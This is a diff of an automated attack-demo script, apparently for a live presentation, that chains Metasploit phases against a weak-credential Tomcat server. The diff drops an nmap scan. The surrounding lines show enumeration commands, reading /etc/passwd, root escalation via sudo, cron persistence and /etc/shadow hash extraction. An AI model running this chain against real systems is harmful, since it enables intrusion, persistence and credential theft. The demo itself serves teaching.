@@ -6,7 +6,6 @@ It runs all phases automatically, showing each command as it executes so viewers
 can follow along with the attack in real-time.
 
 Prerequisites:
-    - Nmap installed (apt install nmap)
     - Metasploit Framework installed (msfconsole)
     - Target must have vulnerable Tomcat 9.0.30 with weak credentials
     - Network connectivity between attacker and target
@@ -165,26 +164,6 @@ class AttackExecutor:
             capture_output=True,
         )
 
-    def phase_0_reconnaissance(self) -> None:
-        """Phase 0: Reconnaissance - Network scanning."""
-        Logger.phase_intro(
-            phase_num=0,
-            title="RECONNAISSANCE",
-            technique="T1046 - Network Service Discovery",
-            description=f"Scanning {self.config.target_ip} to discover open ports and running services.",
-        )
-
-        # Pause for presenter
-        time.sleep(self.config.phase_pause)
-
-        # Run the scan
-        self.terminal.run_command(
-            f"nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open {self.config.target_ip}"
-        )
-
-        Logger.phase_complete("Port scan complete. Tomcat Manager found on port 8080.")
-        Logger.phase_separator()
-
     def run_exploit_phases(self) -> None:
         """Run phases 1 and 3-8 in a single msfconsole session."""
 
@@ -318,7 +297,6 @@ run_cmd("id", {D}session_id)
 run_cmd("uname -a", {D}session_id)
 run_cmd("hostname", {D}session_id)
 run_cmd("cat /etc/passwd | grep -v nologin", {D}session_id)
-run_cmd("lsmod", {D}session_id)
 </ruby>
 
 <ruby>
@@ -464,9 +442,8 @@ puts "\\033[0;35m{'═' * 80}\\033[0m"
 puts ""
 puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mSummary of attack phases executed:\\033[0m"
 puts ""
-puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 0: Reconnaissance      - Scanned target ports with nmap"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 1: Initial Access      - Exploited Tomcat Manager with weak credentials"
-puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 3: Discovery           - Enumerated system info, users, and kernel modules"
+puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 3: Discovery           - Enumerated system info, users, and architecture"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 4: Privilege Escalation- Escalated to root via passwordless sudo"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 5: Persistence         - Installed cron job for persistent access"
 puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 6: Credential Access   - Extracted password hashes from /etc/shadow"
@@ -548,10 +525,7 @@ exit
         Logger.info(f"Attacker: {self.config.attacker_ip}")
         Logger.phase_separator()
 
-        # Phase 0: Reconnaissance (nmap - runs outside msfconsole)
-        self.phase_0_reconnaissance()
-
-        # Phases 1 + 3-8: All run in single msfconsole session
+        # All attack phases run in single msfconsole session
         self.run_exploit_phases()
 
 
